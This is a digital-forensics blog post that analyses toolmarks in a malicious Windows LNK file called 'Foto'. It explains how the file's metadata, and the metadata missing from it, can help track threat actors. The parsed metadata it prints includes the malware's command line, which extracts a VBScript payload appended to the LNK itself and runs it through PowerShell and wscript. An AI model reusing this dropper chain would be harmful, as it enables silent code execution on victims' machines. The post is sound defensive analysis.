---
title: 'LNK Toolmarks'
date: 2019-12-29T12:19:00+01:00
draft: false
---

Matt [posted a blog article](https://bitofhex.com/2019/11/17/say-cheese-an-analysis-of-foto-lnk/) a while back, and I took interest in large part because it involved an LNK file.  Matt provided a hash for the file in question, as well as a walk-through of his "peeling of the onion", as it were.  However, one of the things that Matt pointed out that still needed to be done was [toolmark analysis](https://windowsir.blogspot.com/2018/07/lnk-toolmarks.html).  
  
In his article, Matt says that LNK file, "...stitch together the world between the attacker and the victim."  He's right.  When an actor sends an LNK file to a target, particularly as an email attachment, they are sharing [evidence of their development environment](https://blogs.jpcert.or.jp/en/2016/12/evidence-of-att-3388.html), which can be used to [track threat actors](https://blog.nviso.be/2017/04/04/tracking-threat-actors-through-lnk-files/) and their campaigns.  This is facilitated by the fact that LNK files not only contain a great deal of metadata from the actor's dev environment that act as "toolmarks", but also due to the fact that the absence of portions of that metadata can also be considered "toolmarks", as well.  
  
The metadata extracted from the LNK file Matt discussed is illustrated below:  
  
File: d:\\cases\\lnk\\foto  
guid               {00021401-0000-0000-c000-000000000046}  
mtime              Sat Sep 15 07:28:38 2018 Z  
atime              Thu Sep 26 22:40:14 2019 Z  
ctime              Sat Sep 15 07:28:38 2018 Z  
workingdir         %CD%                            
basepath           C:\\Windows\\System32\\cmd.exe     
shitemidlist       My Computer/C:\\/Windows/System32/cmd.exe  
\*\*Shell Items Details (times in UTC)\*\*  
  C:2018-09-15 06:09:28  M:2019-09-23 17:18:10  A:2019-09-26 22:31:52 Windows  (9)  \[526/1\]  
  C:2018-09-15 06:09:28  M:2019-05-06 20:04:58  A:2019-09-26 22:02:08 System32  (9)  \[2246/1\]  
  C:2018-09-15 07:28:40  M:2018-09-15 07:28:40  A:2019-09-26 22:38:36 cmd.exe  (9)    
vol\_sn             D4DA-5010                       
vol\_type           Fixed Disk                      
commandline        /c start "" explorer "%cd%\\Foto" | powershell -NonInteractive -noLogo -c "& {get-content %cd%\\Foto.lnk | select -Last 1 > %appdata%\\\_.vbe}" && start "" wscript //B "%appdata%\\\_.vbe"  
iconfilename       C:\\Windows\\System32\\shell32.dll  
hotkey             0x0                               
showcmd            0x7                               
  
\*\*\*LinkFlags\*\*\*  
HasLinkTargetIDList|IsUnicode|HasWorkingDir|HasExpIcon|HasLinkInfo|HasArguments|HasIconLocation|HasRelativePath  
  
As you can see, we have a good bit of what we'd expect to see in an LNK file, but there are also elements clearly absent, items we'd expect to see that just aren't there.  For example, there are no Extra Data Blocks (confirmed by visual inspection), and as such, no MAC address, no machine ID (or NetBIOS name), etc.  These missing pieces can be viewed as toolmarks, and we've seen where code executed by an LNK file has been appended to the end of the LNK file itself.   
  
While this particular LNK file is missing a good bit of what we would expect to see, based on the file format, there is still a good bit of information available that can be used to develop a better intel picture.  For example, the volume serial number is intact, and that can be used in a VirusTotal retro-hunt to locate other, perhaps similar LNK files.  This would then give some insight into how often this particular technique (and dev system) seem to be in use and in play, and if the VirusTotal page for each file found contains some information about the campaign, on which it was seen, that might also be helplful.  
  
What something like this illustrates is the need for tying DFIR work much closer to CTI, and even EDR/MSS.  Some organizations still have these functions as separate business units, and this is particularly true within consulting organizations.  In such instances, CTI resources do not have the benefit of accessing DFIR information (and to some extent, vice versa), minimizing the view into incidents and campaigns.  Having the ability to fully exploit DFIR data, such as LNK files, and incorporating that information into CTI reporting produces a much richer picture, as evidenced by [this FireEye write-up regarding Cozy Bear](https://www.fireeye.com/blog/threat-research/2018/11/not-so-cozy-an-uncomfortable-examination-of-a-suspected-apt29-phishing-campaign.html).